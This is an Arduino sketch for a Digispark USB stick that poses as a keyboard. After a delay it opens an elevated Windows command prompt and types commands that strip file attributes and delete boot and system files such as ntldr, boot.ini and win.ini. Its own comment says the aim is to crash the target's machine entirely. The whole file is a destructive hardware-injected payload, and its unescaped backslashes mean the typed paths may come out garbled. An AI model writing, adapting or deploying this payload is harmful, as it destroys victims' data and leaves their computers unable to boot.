#include<DigiKeyboard.h>

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // These will crash target's windows machine entirely 
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(300000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("@echo off");
  DigiKeyboard.delay(200);
  DigiKeyboard.println("attrib -r -s -h C:\autoexec.bat");
  DigiKeyboard.delay(300);
  DigiKeyboard.println("del C:\autoexec.bat");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("attrib -r -s -h C:\boot.ini");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("del C:\boot.ini");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("attrib -r -s -h C:\ntldr");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("del C:\ntldr");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("attrib -r -s -h C:\Windows\win.ini");
  DigiKeyboard.delay(400);
  DigiKeyboard.println("del C:\Windows\win.ini");
  digitalWrite(1, HIGH);
  for(;;){
    //stops the program
  }

}
